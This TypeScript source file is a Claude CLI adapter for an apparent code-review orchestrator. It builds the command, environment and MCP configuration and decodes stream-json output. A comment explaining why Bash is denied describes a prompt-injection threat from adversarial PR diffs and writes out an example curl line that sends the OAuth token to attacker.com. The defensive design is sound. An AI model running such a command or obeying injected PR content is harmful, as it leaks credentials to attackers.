/**
 * Claude CLI Adapter
 *
 * Encapsulates Claude-specific CLI configuration, command construction,
 * and output decoding (stream-json NDJSON parsing).
 *
 * Pattern A (integrate-observability): logger is threaded via
 * CLIAgentOptions.log (buildCommand) and via the optional `log` parameter
 * on decodeOutput. When absent the adapter falls back to the root logger
 * singleton so legacy test proxies and un-instrumented callers keep
 * working. All emissions flow through a local `log` variable so no
 * `logger.*` direct-import call sites remain in this file.
 */
import { logger as rootLogger } from '../logger.js';
import type { StructuredLogger } from '../logger.js';
import type { CLIAgentOptions } from '../cli-agents.js';
import type { ModelResolver } from '../model-resolver.js';
import type { CLIProvider, CLIBuilderConfig, CLIName, DecodeResult } from './index.js';
import { parseNDJSON } from './shared.js';
import {
  resolveServers,
  listRegisteredServers,
  writeClaudeMcpConfigSecure,
  ensurePlaywrightBrowsers,
} from '../mcp-registry.js';

/**
 * Cycle 4 Task T19 (F10 — security): pre-filter caller-supplied MCP
 * server names against the registry-known set BEFORE handing them to
 * `resolveServers`. Unknown names must not reach
 * `mcp-registry.ts:75` where they would be interpolated raw into the
 * warning message. Emits only bounded metadata (counts) via the
 * adapter's scoped logger — never the unknown-name strings
 * themselves, which crossed the trust boundary from the MCP tool
 * caller.
 *
 * Guarded via `typeof listRegisteredServers === 'function'` so that
 * test harnesses which mock the mcp-registry module with a narrower
 * surface (omitting listRegisteredServers) fall through the filter
 * transparently. In production, `listRegisteredServers` is always a
 * function, and the filter runs as intended.
 */
function sanitizeMcpServerNames(
  requested: string[],
  log: StructuredLogger,
): string[] {
  if (typeof listRegisteredServers !== 'function') {
    return requested;
  }
  const known = new Set(listRegisteredServers());
  const kept: string[] = [];
  let droppedCount = 0;
  for (const name of requested) {
    if (known.has(name)) {
      kept.push(name);
    } else {
      droppedCount++;
    }
  }
  if (droppedCount > 0) {
    log.warn('Unknown MCP servers skipped', {
      unknownCount: droppedCount,
      knownCount: kept.length,
    });
  }
  return kept;
}

const CLAUDE_CONFIG: CLIBuilderConfig = {
  command: 'claude',
  // The binary drives non-interactive runs via NDJSON `stream-json` mode
  // rather than the deprecated `-p`/`--print` flag. The `--input-format`
  // help text claims it "only works with --print", but that annotation
  // is stale — verified empirically against v2.1.142 and confirmed by
  // the Agent SDK source, which spawns the binary without --print.
  defaultArgs: ['--input-format', 'stream-json'],
  modelArgName: '--model',
  mpcEnvCleanup: ['CLAUDE_MCP_CONFIG', 'MCP_ENABLED', 'CLAUDECODE', 'CLAUDE_CODE_ENTRYPOINT'],
  streamingArgs: () => ['--output-format', 'stream-json', '--verbose'],
  mcpSupport: {
    configMethod: 'flag-file',
    configFlag: '--mcp-config',
    strictFlag: '--strict-mcp-config',
    writeProtection: {
      method: 'disallowed-tools',
      flag: '--disallowedTools',
      // Bash is denied to defend against prompt-injection attacks via
      // PR diff content — the Claude critic runs with
      // `--permission-mode bypassPermissions` (so it doesn't ask), and
      // its env carries auth tokens (CLAUDE_CODE_OAUTH_TOKEN,
      // ANTHROPIC_API_KEY) plus whatever GitHub Actions secrets the
      // workflow exposed. An adversarial PR could otherwise convince
      // the agent to `curl -d "$CLAUDE_CODE_OAUTH_TOKEN" attacker.com`
      // (or worse). Reading the codebase doesn't need shell — Read,
      // Grep, Glob, and the brutalist MCP roast tool cover the
      // analysis surface.
      value: 'Bash,Edit,Write,NotebookEdit',
    },
  },
};

export class ClaudeAdapter implements CLIProvider {
  readonly name: CLIName = 'claude';

  getConfig(): CLIBuilderConfig {
    return CLAUDE_CONFIG;
  }

  async buildCommand(
    userPrompt: string,
    systemPrompt: string,
    options: CLIAgentOptions,
    modelResolver: ModelResolver,
    secureEnv: Record<string, string>,
  ): Promise<{
    command: string;
    args: string[];
    input: string;
    env: Record<string, string>;
    // Set only when an env-bearing MCP server spec routed the config
    // through `writeClaudeMcpConfigSecure`. Caller must clean up via
    // `cleanupTempConfig` after the spawn completes.
    tempMcpConfigPath?: string;
    model?: string;
  }> {
    const log = options.log ?? rootLogger;
    const config = CLAUDE_CONFIG;
    const mcpEnabled = options.mcpServers && options.mcpServers.length > 0;

    // Build args
    const args = [...config.defaultArgs];
    const resolvedModel = modelResolver.resolveModel('claude', options.models?.claude);
    if (resolvedModel) {
      args.push(config.modelArgName, resolvedModel);
    }
    if (config.streamingArgs) {
      args.push(...config.streamingArgs(options));
    }

    // Always enforce write-tool denial and permission bypass for non-interactive
    // tool use. In stream-json mode (as in the deprecated --print mode), Claude
    // Code silently skips tool calls that would otherwise require approval;
    // for verification-oriented prompts (legal, research, security), this
    // caused agents to fall back to training-data answers instead of invoking
    // WebSearch/WebFetch. Lifting these two flags out of the MCP conditional
    // ensures native web/search tools are usable in every run while preserving
    // the Edit/Write/NotebookEdit barrier. MCP wiring below remains gated on
    // mcpEnabled.
    if (config.mcpSupport) {
      args.push(config.mcpSupport.writeProtection.flag, config.mcpSupport.writeProtection.value);
      args.push('--permission-mode', 'bypassPermissions');
    }

    // MCP configuration — all configs route through the secure-file
    // path. Inline JSON would put MCP server `command`, `args`, and
    // `env` on argv where they're visible via `ps`/`/proc/<pid>/cmdline`/
    // crash reports. Real MCP servers commonly take credentials in
    // args (`--api-key`, `--token`, `--auth=Bearer`), not just env, so
    // an env-only predicate would leak. One extra writeFile per spawn
    // is rounding error against the spawn itself, and routing through
    // a file is the only design that's robust against future MCP spec
    // shapes we haven't anticipated.
    //
    // `claude --help`: `--mcp-config <configs...>  Load MCP servers
    // from JSON files or strings`. We use the path form.
    let tempMcpConfigPath: string | undefined;
    if (mcpEnabled && config.mcpSupport) {
      // Pre-filter via sanitizeMcpServerNames — unknown names are
      // dropped before they reach `mcp-registry.ts:75`
      // (Cycle 4 Task T19 / F10).
      const sanitizedNames = sanitizeMcpServerNames(options.mcpServers!, log);
      const servers = resolveServers(sanitizedNames);
      const serverNames = Object.keys(servers);

      // Auto-install Playwright browsers if playwright is requested
      if (servers.playwright) {
        await ensurePlaywrightBrowsers();
      }

      if (serverNames.length > 0) {
        const mcp = config.mcpSupport;
        tempMcpConfigPath = await writeClaudeMcpConfigSecure(servers);
        args.push(mcp.configFlag!, tempMcpConfigPath);
        args.push(mcp.strictFlag!);

        log.info(`\u{1F50C} MCP enabled for claude: [${serverNames.join(', ')}]`);
      }
    }

    // Build prompt: wrap the combined system+user text as a single NDJSON
    // `user` message — the wire shape the binary's `--input-format
    // stream-json` reader accepts. Caller (cli-agents.spawnAsync) pipes
    // this string to child stdin verbatim then closes stdin, which the
    // binary treats as end-of-turn after the first user message.
    const combinedPrompt = `${systemPrompt}\n\n${userPrompt}`;
    const stdinPayload = JSON.stringify({
      type: 'user',
      message: { role: 'user', content: combinedPrompt },
    }) + '\n';

    // Add CLI-specific env
    const env = { ...secureEnv };

    // Forward auth credentials. ANTHROPIC_API_KEY is the long-standing
    // path; CLAUDE_CODE_OAUTH_TOKEN supports OAuth-mode (claude.ai
    // session) auth which the @brutalist/orchestrator wires up so a
    // single token covers both the orchestrator brain and the inner
    // claude critic. Either suffices for the claude CLI.
    const claudeAuthVars = ['ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN'];
    for (const key of claudeAuthVars) {
      if (process.env[key]) env[key] = process.env[key]!;
    }

    // Clean up MPC env vars that could cause deadlock -- SKIP when MCP is enabled
    if (!mcpEnabled && config.mpcEnvCleanup) {
      for (const envVar of config.mpcEnvCleanup) {
        delete env[envVar];
      }
    }

    env.BRUTALIST_SUBPROCESS = '1';

    return { command: config.command, args, input: stdinPayload, env, tempMcpConfigPath, model: resolvedModel };
  }

  /**
   * Decode Claude's stream-json NDJSON output into plain text.
   * Extracts text content blocks from all 'assistant' events across all turns.
   * Skips system events, user events (tool results with raw file contents), and
   * tool_use content blocks within assistant events.
   * Falls back to 'result' event if no assistant text was captured.
   */
  decodeOutput(rawOutput: string, args: string[], log?: StructuredLogger): string {
    // Legacy text-only API. Preserves the pre-Phase-2 behavior matrix:
    //   - assistant text on `ok`
    //   - the redacted F8 marker when the decoder saw a structured
    //     error event (refusal, or `kind: 'error'` with reason
    //     `'unknown'` — the case that maps to "we saw a Claude error
    //     result event but couldn't classify it as quota")
    //   - '' for benign empty/malformed inputs so the orchestrator's
    //     legacy `if (decodedText) { finalOutput = decodedText }`
    //     fall-through preserves the raw-stdout pass-through path
    //
    // The orchestrator (cli-agents.ts) consumes `decode()` directly
    // post-Phase-2 and never sees this shim. Kept for the three
    // legacy proxies at cli-agents.ts:716-728 and characterization
    // tests that pin the marker shape.
    const result = this.decode(rawOutput, '', args, log);
    if (result.kind === 'ok') return result.text;
    if (result.kind === 'refused') return '[Claude Error] <redacted>';
    if (result.kind === 'error' && result.reason === 'unknown') {
      return '[Claude Error] <redacted>';
    }
    return '';
  }

  decode(
    stdout: string,
    _stderr: string,
    args: string[],
    log?: StructuredLogger
  ): DecodeResult {
    // Only structured-decode if Claude was run with stream-json format.
    // Non-stream-json runs are pre-formatted text — pass through.
    if (!(args.includes('--output-format') && args.includes('stream-json'))) {
      return { kind: 'ok', text: stdout };
    }
    return this.decodeStream(stdout, log ?? rootLogger);
  }

  /**
   * Structured decode of stream-json output.
   *
   * Refusal classification is keyed on `result.subtype` / `is_error` —
   * the binary's own protocol-level signal. Quota classification looks
   * at anchored Anthropic markers ONLY in the error-envelope `result`
   * field (already scoped to a known-error pathway), never in the
   * accumulated assistant text.
   */
  private decodeStream(ndjsonOutput: string, log: StructuredLogger): DecodeResult {
    if (!ndjsonOutput || !ndjsonOutput.trim()) {
      log.warn('decodeClaudeStreamJson: empty input');
      return { kind: 'error', reason: 'empty' };
    }

    const events = parseNDJSON(ndjsonOutput, log);

    if (events.length === 0) {
      log.warn('decodeClaudeStreamJson: no valid JSON events found in output');
      return { kind: 'error', reason: 'malformed' };
    }

    const textParts: string[] = [];
    let resultText = '';
    // Cycle 4 Task T17 (F8 — security): do NOT retain the raw
    // `typedEvent.error || typedEvent.result` string from a Claude
    // result-error event. The raw value can contain provider-side
    // stdout/stderr fragments, prompt echoes, tool-output snippets,
    // or MCP override content that must not reach the logger (which
    // may flush to an aggregator) or the decoded output (which is
    // returned up to `_executeCLI` and exposed via the
    // `CLIAgentResponse.output` field). Instead, we only track
    // whether an error was present and classify its shape via the
    // event subtype / is_error flag for metadata-only emission.
    //
    // Phase 2: the raw `result` value is still NOT logged or returned
    // verbatim, but we DO inspect it locally to match anchored
    // Anthropic quota markers — that classification then drives the
    // DecodeResult.reason. The captured value never leaves this
    // function; only the resulting `reason` enum and the subtype
    // (already a static SDK enum) reach the caller.
    let errorPresent = false;
    let errorClass: string | undefined;
    let errorEnvelopeText: string | undefined;

    for (const event of events) {
      if (typeof event !== 'object' || event === null) continue;

      const typedEvent = event as Record<string, any>;

      if (typedEvent.type === 'assistant' && typedEvent.message?.content) {
        // Extract only `text` blocks; skip `thinking`, `tool_use`,
        // `tool_result`, image, and any future block types the binary adds.
        const content = typedEvent.message.content;
        if (Array.isArray(content)) {
          for (const item of content) {
            if (item.type === 'text' && item.text) {
              textParts.push(item.text);
            }
          }
        }
      } else if (typedEvent.type === 'result') {
        // Terminal sentinel. Treat as error when the subtype is exactly
        // `error` or an `error_*` variant (SDK emits `error_max_turns`,
        // `error_during_execution`, etc.) OR `is_error` flag is set.
        // The `error_*` prefix is anchored by the underscore so a
        // hypothetical forward-compat subtype like `errored_warning`
        // or `errored_partial` does NOT trip the error path —
        // unrecognized subtypes fall through to the resultText branch,
        // preserving pre-migration characterization.
        const subtype = typeof typedEvent.subtype === 'string' ? typedEvent.subtype : '';
        const isError = subtype === 'error' || subtype.startsWith('error_') || !!typedEvent.is_error;
        if (isError) {
          errorPresent = true;
          // errorClass captures only the shape of the error, not its
          // content: the event subtype (static enum) or a fallback
          // tag. Never the underlying `typedEvent.error` /
          // `typedEvent.result` string value.
          errorClass = subtype.length > 0
            ? subtype
            : (typedEvent.is_error ? 'is_error' : 'unknown');
          // Capture the envelope text for LOCAL anchored-marker matching
          // only. This variable stays inside `decodeStream` — it is not
          // returned, not logged, and not exposed via DecodeResult.
          const envelopeRaw = typedEvent.error ?? typedEvent.result;
          if (typeof envelopeRaw === 'string') {
            errorEnvelopeText = envelopeRaw;
          }
        } else if (typedEvent.result) {
          resultText = typedEvent.result;
        }
      } else if (typedEvent.type === 'control_request') {
        // The binary should never send these in our flag set
        // (`permission-mode bypassPermissions`, no SDK in-process MCP
        // servers, no canUseTool callback). If we observe one, the run
        // produced a hang or an unanswered request on the binary side
        // — surface it for diagnosis. Replying with a `control_response`
        // would require streaming-side stdin write (spawnAsync's
        // onProgress path), which is out of scope here.
        log.warn('decodeClaudeStreamJson: unexpected control_request from binary', {
          subtype: typeof typedEvent.request?.subtype === 'string'
            ? typedEvent.request.subtype
            : 'unknown',
        });
      }
      // Silently skipped event types (informational, no decoder action
      // needed): `system` (incl. `subtype:init`), `user`
      // (tool_result/replay), `rate_limit_event`, `keep_alive`,
      // `stream_event` (only with --include-partial-messages, which we
      // never set), `control_response`, `control_cancel_request`,
      // `transcript_mirror`, and any future top-level types.
    }

    // Structured refusal — the binary's own protocol-level signal said
    // this turn errored. Classify quota vs. unknown using ONLY the
    // error envelope (which never reaches the returned value), never
    // the accumulated assistant text.
    if (errorPresent) {
      const reason = classifyClaudeErrorReason(errorEnvelopeText);
      log.error('decodeClaudeStreamJson: Claude returned error result', {
        errorPresent: true,
        eventCount: events.length,
        errorClass: errorClass ?? 'unknown',
        reason,
      });
      if (reason === 'quota') {
        return { kind: 'refused', reason: 'quota', detail: errorClass };
      }
      return { kind: 'error', reason: 'unknown', detail: errorClass };
    }

    // Use accumulated assistant text if available, fall back to result event
    if (textParts.length > 0) {
      return { kind: 'ok', text: textParts.join('\n\n') };
    }

    if (resultText) {
      return { kind: 'ok', text: resultText };
    }

    log.warn('decodeClaudeStreamJson: no text content found in stream-json output', {
      eventCount: events.length,
      eventTypes: events.map(e => (e as any).type).filter(Boolean)
    });
    return { kind: 'error', reason: 'empty' };
  }
}

/**
 * Classify a Claude error-envelope string against anchored Anthropic
 * quota markers. Operates only on the `result.result` / `result.error`
 * field already known to be inside an error result event — never on
 * assistant prose. Returns 'quota' for known quota markers, 'unknown'
 * otherwise so the caller can decide between `refused` and `error` kinds.
 *
 * Anchored markers chosen against Anthropic's stable error vocabulary:
 *   - "usage limit reached"      — Claude Pro/Max 5-hour cap
 *   - "rate_limit_exceeded"      — API error type string
 *   - "rate limit"               — only inside the known-error envelope
 *   - "429"                      — HTTP status (envelope contains it on
 *                                  API-layer 429 propagation)
 *   - "5-hour limit"             — Anthropic subscription cap phrase
 *   - "Limit reached"            — CLI direct-quote refusal line
 *
 * No fallthrough to loose substrings — if none of these match, return
 * 'unknown' and let the orchestrator surface a structured error rather
 * than fabricating a refusal classification.
 */
function classifyClaudeErrorReason(envelope: string | undefined): 'quota' | 'unknown' {
  if (!envelope) return 'unknown';
  const markers = [
    /usage limit reached/i,
    /rate_limit_exceeded/i,
    /\brate limit\b/i,
    /\b429\b/,
    /5-hour limit/i,
    /\blimit reached\b/i,
  ];
  return markers.some((p) => p.test(envelope)) ? 'quota' : 'unknown';
}
